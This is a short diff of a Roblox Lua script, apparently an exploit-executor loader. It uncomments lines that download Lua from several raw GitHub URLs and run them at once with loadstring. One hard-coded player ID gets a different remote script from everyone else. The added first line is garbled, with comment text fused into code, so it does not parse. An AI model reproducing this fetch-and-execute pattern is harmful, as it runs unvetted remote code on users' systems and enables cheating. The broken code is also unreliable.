@@ -1,11 +1,9 @@
---local player = game:GetService("Players").LocalPlayer
-
--- Check if player matches restricted IDs or names
---if player.UserId == 3908687115 or player.Name == "Simulator_Goddess123" then
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/OhhMyGehlee/tist/refs/heads/main/no"))()
---else
-    -- Execute the loadstring if player doesn't match restricted criteria
-    setfpscap(30)
---    loadstring(game:HttpGet("https://raw.githubusercontent.com/Itzboo666/roblox/refs/heads/main/web-serv"))()
---    loadstring(game:HttpGet("https://raw.githubusercontent.com/IdiotHub/Scripts/refs/heads/main/BGSI/main.lua"))()
---end
+local player = game:GetService("Players").LocalPlayer Check if player matches restricted IDs or names
+if player.UserId == 3908687115 or player.Name == "Simulator_Goddess123" then
+  loadstring(game:HttpGet("https://raw.githubusercontent.com/OhhMyGehlee/tist/refs/heads/main/no"))()
+else
+  -- Execute the loadstring if player doesn't match restricted criteria
+  setfpscap(30)
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/Itzboo666/roblox/refs/heads/main/web-serv"))()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/IdiotHub/Scripts/refs/heads/main/BGSI/main.lua"))()
+end
